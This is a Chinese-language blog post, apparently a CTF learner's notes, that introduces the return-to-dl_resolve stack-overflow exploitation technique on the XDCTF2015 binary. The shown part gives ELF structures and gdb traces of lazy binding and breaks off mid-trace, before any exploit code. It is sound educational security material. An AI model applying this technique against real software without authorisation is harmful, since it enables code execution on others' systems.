<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>Return_to_dl_resolve | V1NKe的心情垃圾桶</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="PWN," />
  

  <meta name="description" content="PWN,dl_reslove">
<meta name="keywords" content="PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="Return_to_dl_resolve">
<meta property="og:url" content="http://yoursite.com/2018/06/26/Return_to_dl_resolve/index.html">
<meta property="og:site_name" content="V1NKe的心情垃圾桶">
<meta property="og:description" content="PWN,dl_reslove">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/Return_to_dl_resolve/1.png">
<meta property="og:image" content="http://yoursite.com/Return_to_dl_resolve/6.1.3_attack.png">
<meta property="og:image" content="http://yoursite.com/Return_to_dl_resolve/6.1.3_link_map.png">
<meta property="og:image" content="http://yoursite.com/Return_to_dl_resolve/resolve13.png">
<meta property="og:image" content="http://yoursite.com/Return_to_dl_resolve/742286_YBW9WNCFG6ARTBN.png">
<meta property="og:image" content="http://yoursite.com/Return_to_dl_resolve/resolve14.png">
<meta property="og:image" content="http://yoursite.com/Return_to_dl_resolve/resolve15.png">
<meta property="og:updated_time" content="2018-09-13T13:48:22.751Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Return_to_dl_resolve">
<meta name="twitter:description" content="PWN,dl_reslove">
<meta name="twitter:image" content="http://yoursite.com/Return_to_dl_resolve/1.png">

  

  
    <link rel="icon" href="/haimian.ico">
  

  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">盒子</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/tag/"
            rel="noopener noreferrer"
            target="_self"
            >
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/link/"
            rel="noopener noreferrer"
            target="_self"
            >
            友链
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            关于
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简介："><span class="toc-text">简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写在前面："><span class="toc-text">写在前面：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍："><span class="toc-text">介绍：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-原理介绍："><span class="toc-text">0x1. 原理介绍：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-攻击方式："><span class="toc-text">0x2. 攻击方式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-实例攻击方式："><span class="toc-text">0x3. 实例攻击方式：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0xa-第一种攻击方式："><span class="toc-text">0xa. 第一种攻击方式：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0xb-第二种攻击方式："><span class="toc-text">0xb. 第二种攻击方式：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference："><span class="toc-text">Reference：</span></a></li></ol></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-Return_to_dl_resolve" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">Return_to_dl_resolve</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2018.06.26</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>V1NKe</span>
        </span>
      

      


      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbsp热度 <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>℃
        </span>
      
      
    </div>
  </header>

  <div class="article-content">
    
      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>近期是期末阶段了，不想复习啊:b。真滴是难受，学pwn也有一个学期了，倒没学的有多好，只是能把栈溢出和格式化这一块基本上的知识点全都学明白了，暑假的时候再好好学一学堆上面的知识，然后我就可以开始研究cve啦～大概的计划就是这样的了。</p>
<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>主要写一写花了好久才弄懂的一个栈溢出的高级利用方式：return_to_dl_resolve。这一块的知识点虽然说网上确实有蛮多的，但是很多小点处我都不是特别明白，所以说一直卡了很久，现在把自己所遇到的一些坑点写一写。</p>
<h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>亲自实践过后所得的原因，为什么要在bss段的基址再加上一段偏移的地址开始写内容？</p>
<p>解答：因为亲自实践可发现如果直接从bss段地址开始写，跳转到plt地址执行的之后的几个指令会有多个push指令，所以如果栈顶是bss开始地址，那么再push之后会越出bss段的范围，所以程序会直接崩溃，所以需要我们再bss基址上加上偏移再开始写内容。</p>
<h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><h3 id="0x1-原理介绍："><a href="#0x1-原理介绍：" class="headerlink" title="0x1. 原理介绍："></a>0x1. 原理介绍：</h3><p>我们知道，在动态链接中，如果程序没有开启 Full RELRO 保护，则存在延迟绑定的过程，即库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成绑定。</p>
<p>一个动态链接程序的程序头表中会包含类型为 <code>PT_DYNAMIC</code> 的段，它包含了 <code>.dynamic</code> 段，结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Sword   d_tag;          /* Dynamic entry type */</span><br><span class="line">  union</span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word d_val;         /* Integer value */</span><br><span class="line">      Elf32_Addr d_ptr;         /* Address value */</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Sxword  d_tag;          /* Dynamic entry type */</span><br><span class="line">  union</span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;        /* Integer value */</span><br><span class="line">      Elf64_Addr d_ptr;         /* Address value */</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>
<p>一个 <code>Elf_Dyn</code> 是一个键值对，其中 <code>d_tag</code> 是键，<code>d_value</code> 是值。其中有个例外的条目是 <code>DT_DEBUG</code>，它保存了动态装载器内部数据结构的指针。</p>
<p>段表结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    sh_name;        /* Section name (string tbl index) */</span><br><span class="line">  Elf32_Word    sh_type;        /* Section type */</span><br><span class="line">  Elf32_Word    sh_flags;       /* Section flags */</span><br><span class="line">  Elf32_Addr    sh_addr;        /* Section virtual addr at execution */</span><br><span class="line">  Elf32_Off sh_offset;      /* Section file offset */</span><br><span class="line">  Elf32_Word    sh_size;        /* Section size in bytes */</span><br><span class="line">  Elf32_Word    sh_link;        /* Link to another section */</span><br><span class="line">  Elf32_Word    sh_info;        /* Additional section information */</span><br><span class="line">  Elf32_Word    sh_addralign;       /* Section alignment */</span><br><span class="line">  Elf32_Word    sh_entsize;     /* Entry size if section holds table */</span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Word    sh_name;        /* Section name (string tbl index) */</span><br><span class="line">  Elf64_Word    sh_type;        /* Section type */</span><br><span class="line">  Elf64_Xword   sh_flags;       /* Section flags */</span><br><span class="line">  Elf64_Addr    sh_addr;        /* Section virtual addr at execution */</span><br><span class="line">  Elf64_Off sh_offset;      /* Section file offset */</span><br><span class="line">  Elf64_Xword   sh_size;        /* Section size in bytes */</span><br><span class="line">  Elf64_Word    sh_link;        /* Link to another section */</span><br><span class="line">  Elf64_Word    sh_info;        /* Additional section information */</span><br><span class="line">  Elf64_Xword   sh_addralign;       /* Section alignment */</span><br><span class="line">  Elf64_Xword   sh_entsize;     /* Entry size if section holds table */</span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>
<p>具体来看，首先在 write@plt 地址处下断点，然后运行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p write</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x8048430 &lt;write@plt&gt;</span><br><span class="line">gdb-peda$ b *0x8048430</span><br><span class="line">Breakpoint 1 at 0x8048430</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/firmy/Desktop/RE4B/200/a.out </span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f04 --&gt; 0x1 </span><br><span class="line">ECX: 0x2a8c </span><br><span class="line">EDX: 0x3 </span><br><span class="line">ESI: 0xf7f8ee28 --&gt; 0x1d1d30 </span><br><span class="line">EDI: 0xffffd620 --&gt; 0x1 </span><br><span class="line">EBP: 0xffffd638 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd59c --&gt; 0x804861b (add    esp,0x10)</span><br><span class="line">EIP: 0x8048430 (&lt;write@plt&gt;:    jmp    DWORD PTR ds:0x804a01c)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048420 &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:0x804a018</span><br><span class="line">   0x8048426 &lt;__libc_start_main@plt+6&gt;: push   0x18</span><br><span class="line">   0x804842b &lt;__libc_start_main@plt+11&gt;:        jmp    0x80483e0</span><br><span class="line">=&gt; 0x8048430 &lt;write@plt&gt;:       jmp    DWORD PTR ds:0x804a01c</span><br><span class="line"> | 0x8048436 &lt;write@plt+6&gt;:     push   0x20</span><br><span class="line"> | 0x804843b &lt;write@plt+11&gt;:    jmp    0x80483e0</span><br><span class="line"> | 0x8048440:   jmp    DWORD PTR ds:0x8049ff0</span><br><span class="line"> | 0x8048446:   xchg   ax,ax</span><br><span class="line"> |-&gt;   0x8048436 &lt;write@plt+6&gt;: push   0x20</span><br><span class="line">       0x804843b &lt;write@plt+11&gt;:        jmp    0x80483e0</span><br><span class="line">       0x8048440:       jmp    DWORD PTR ds:0x8049ff0</span><br><span class="line">       0x8048446:       xchg   ax,ax</span><br><span class="line">                                                                  JUMP is taken</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd59c --&gt; 0x804861b (add    esp,0x10)</span><br><span class="line">0004| 0xffffd5a0 --&gt; 0x1 </span><br><span class="line">0008| 0xffffd5a4 --&gt; 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">0012| 0xffffd5a8 --&gt; 0x17 </span><br><span class="line">0016| 0xffffd5ac --&gt; 0x80485a4 (add    ebx,0x1a5c)</span><br><span class="line">0020| 0xffffd5b0 --&gt; 0xffffd5ea --&gt; 0x0 </span><br><span class="line">0024| 0xffffd5b4 --&gt; 0xf7ffca64 --&gt; 0x6 </span><br><span class="line">0028| 0xffffd5b8 --&gt; 0xf7ffca68 --&gt; 0x3c (&apos;&lt;&apos;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048430 in write@plt ()</span><br><span class="line">gdb-peda$ x/w 0x804a01c</span><br><span class="line">0x804a01c:      0x08048436</span><br></pre></td></tr></table></figure>
<p>由于是第一次运行，尚未进行绑定，<code>0x804a01c</code> 地址处保存的是 write@plt+6 的地址 <code>0x8048436</code>，即跳转到下一条指令。</p>
<p>将 <code>0x20</code> 压入栈中，这个数字是导入函数的标识，即一个 ELF_Rel 在 <code>.rel.plt</code> 中的偏移：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f04 --&gt; 0x1 </span><br><span class="line">ECX: 0x2a8c </span><br><span class="line">EDX: 0x3 </span><br><span class="line">ESI: 0xf7f8ee28 --&gt; 0x1d1d30 </span><br><span class="line">EDI: 0xffffd620 --&gt; 0x1 </span><br><span class="line">EBP: 0xffffd638 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd59c --&gt; 0x804861b (add    esp,0x10)</span><br><span class="line">EIP: 0x8048436 (&lt;write@plt+6&gt;:  push   0x20)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048426 &lt;__libc_start_main@plt+6&gt;: push   0x18</span><br><span class="line">   0x804842b &lt;__libc_start_main@plt+11&gt;:        jmp    0x80483e0</span><br><span class="line">   0x8048430 &lt;write@plt&gt;:       jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">=&gt; 0x8048436 &lt;write@plt+6&gt;:     push   0x20</span><br><span class="line">   0x804843b &lt;write@plt+11&gt;:    jmp    0x80483e0</span><br><span class="line">   0x8048440:   jmp    DWORD PTR ds:0x8049ff0</span><br><span class="line">   0x8048446:   xchg   ax,ax</span><br><span class="line">   0x8048448:   add    BYTE PTR [eax],al</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd59c --&gt; 0x804861b (add    esp,0x10)</span><br><span class="line">0004| 0xffffd5a0 --&gt; 0x1 </span><br><span class="line">0008| 0xffffd5a4 --&gt; 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">0012| 0xffffd5a8 --&gt; 0x17 </span><br><span class="line">0016| 0xffffd5ac --&gt; 0x80485a4 (add    ebx,0x1a5c)</span><br><span class="line">0020| 0xffffd5b0 --&gt; 0xffffd5ea --&gt; 0x0 </span><br><span class="line">0024| 0xffffd5b4 --&gt; 0xf7ffca64 --&gt; 0x6 </span><br><span class="line">0028| 0xffffd5b8 --&gt; 0xf7ffca68 --&gt; 0x3c (&apos;&lt;&apos;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048436 in write@plt ()</span><br></pre></td></tr></table></figure>
<p>然后跳转到 <code>0x80483e0</code>，该地址是 <code>.plt</code> 段的开头，即 PLT[0]：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f04 --&gt; 0x1 </span><br><span class="line">ECX: 0x2a8c </span><br><span class="line">EDX: 0x3 </span><br><span class="line">ESI: 0xf7f8ee28 --&gt; 0x1d1d30 </span><br><span class="line">EDI: 0xffffd620 --&gt; 0x1 </span><br><span class="line">EBP: 0xffffd638 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd598 --&gt; 0x20 (&apos; &apos;)</span><br><span class="line">EIP: 0x804843b (&lt;write@plt+11&gt;: jmp    0x80483e0)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x804842b &lt;__libc_start_main@plt+11&gt;:        jmp    0x80483e0</span><br><span class="line">   0x8048430 &lt;write@plt&gt;:       jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">   0x8048436 &lt;write@plt+6&gt;:     push   0x20</span><br><span class="line">=&gt; 0x804843b &lt;write@plt+11&gt;:    jmp    0x80483e0</span><br><span class="line"> | 0x8048440:   jmp    DWORD PTR ds:0x8049ff0</span><br><span class="line"> | 0x8048446:   xchg   ax,ax</span><br><span class="line"> | 0x8048448:   add    BYTE PTR [eax],al</span><br><span class="line"> | 0x804844a:   add    BYTE PTR [eax],al</span><br><span class="line"> |-&gt;   0x80483e0:       push   DWORD PTR ds:0x804a004</span><br><span class="line">       0x80483e6:       jmp    DWORD PTR ds:0x804a008</span><br><span class="line">       0x80483ec:       add    BYTE PTR [eax],al</span><br><span class="line">       0x80483ee:       add    BYTE PTR [eax],al</span><br><span class="line">                                                                  JUMP is taken</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd598 --&gt; 0x20 (&apos; &apos;)</span><br><span class="line">0004| 0xffffd59c --&gt; 0x804861b (add    esp,0x10)</span><br><span class="line">0008| 0xffffd5a0 --&gt; 0x1 </span><br><span class="line">0012| 0xffffd5a4 --&gt; 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">0016| 0xffffd5a8 --&gt; 0x17 </span><br><span class="line">0020| 0xffffd5ac --&gt; 0x80485a4 (add    ebx,0x1a5c)</span><br><span class="line">0024| 0xffffd5b0 --&gt; 0xffffd5ea --&gt; 0x0 </span><br><span class="line">0028| 0xffffd5b4 --&gt; 0xf7ffca64 --&gt; 0x6 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0804843b in write@plt ()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S a.out | grep 80483e0</span><br><span class="line">  [12] .plt              PROGBITS        080483e0 0003e0 000060 04  AX  0   0 16</span><br></pre></td></tr></table></figure>
<p>接下来就进入 PLT[0] 处的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f04 --&gt; 0x1 </span><br><span class="line">ECX: 0x2a8c </span><br><span class="line">EDX: 0x3 </span><br><span class="line">ESI: 0xf7f8ee28 --&gt; 0x1d1d30 </span><br><span class="line">EDI: 0xffffd620 --&gt; 0x1 </span><br><span class="line">EBP: 0xffffd638 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd598 --&gt; 0x20 (&apos; &apos;)</span><br><span class="line">EIP: 0x80483e0 (push   DWORD PTR ds:0x804a004)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">=&gt; 0x80483e0:   push   DWORD PTR ds:0x804a004</span><br><span class="line">   0x80483e6:   jmp    DWORD PTR ds:0x804a008</span><br><span class="line">   0x80483ec:   add    BYTE PTR [eax],al</span><br><span class="line">   0x80483ee:   add    BYTE PTR [eax],al</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd598 --&gt; 0x20 (&apos; &apos;)</span><br><span class="line">0004| 0xffffd59c --&gt; 0x804861b (add    esp,0x10)</span><br><span class="line">0008| 0xffffd5a0 --&gt; 0x1 </span><br><span class="line">0012| 0xffffd5a4 --&gt; 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">0016| 0xffffd5a8 --&gt; 0x17 </span><br><span class="line">0020| 0xffffd5ac --&gt; 0x80485a4 (add    ebx,0x1a5c)</span><br><span class="line">0024| 0xffffd5b0 --&gt; 0xffffd5ea --&gt; 0x0 </span><br><span class="line">0028| 0xffffd5b4 --&gt; 0xf7ffca64 --&gt; 0x6 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x080483e0 in ?? ()</span><br><span class="line">gdb-peda$ x/w 0x804a004</span><br><span class="line">0x804a004:      0xf7ffd900</span><br><span class="line">gdb-peda$ x/w 0x804a008</span><br><span class="line">0x804a008:      0xf7fec370</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S a.out | grep .got.plt</span><br><span class="line">  [23] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4</span><br></pre></td></tr></table></figure>
<p>看一下 <code>.got.plt</code> 段，所以 <code>0x804a004</code> 和 <code>0x804a008</code> 分别是 GOT[1] 和 GOT[2]。继续调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f04 --&gt; 0x1 </span><br><span class="line">ECX: 0x2a8c </span><br><span class="line">EDX: 0x3 </span><br><span class="line">ESI: 0xf7f8ee28 --&gt; 0x1d1d30 </span><br><span class="line">EDI: 0xffffd620 --&gt; 0x1 </span><br><span class="line">EBP: 0xffffd638 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd594 --&gt; 0xf7ffd900 --&gt; 0x0 </span><br><span class="line">EIP: 0x80483e6 (jmp    DWORD PTR ds:0x804a008)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x80483dd:   add    BYTE PTR [eax],al</span><br><span class="line">   0x80483df:   add    bh,bh</span><br><span class="line">   0x80483e1:   xor    eax,0x804a004</span><br><span class="line">=&gt; 0x80483e6:   jmp    DWORD PTR ds:0x804a008</span><br><span class="line"> | 0x80483ec:   add    BYTE PTR [eax],al</span><br><span class="line"> | 0x80483ee:   add    BYTE PTR [eax],al</span><br><span class="line"> | 0x80483f0 &lt;setbuf@plt&gt;:      jmp    DWORD PTR ds:0x804a00c</span><br><span class="line"> | 0x80483f6 &lt;setbuf@plt+6&gt;:    push   0x0</span><br><span class="line"> |-&gt;   0xf7fec370 &lt;_dl_runtime_resolve&gt;:        push   eax</span><br><span class="line">       0xf7fec371 &lt;_dl_runtime_resolve+1&gt;:      push   ecx</span><br><span class="line">       0xf7fec372 &lt;_dl_runtime_resolve+2&gt;:      push   edx</span><br><span class="line">       0xf7fec373 &lt;_dl_runtime_resolve+3&gt;:      mov    edx,DWORD PTR 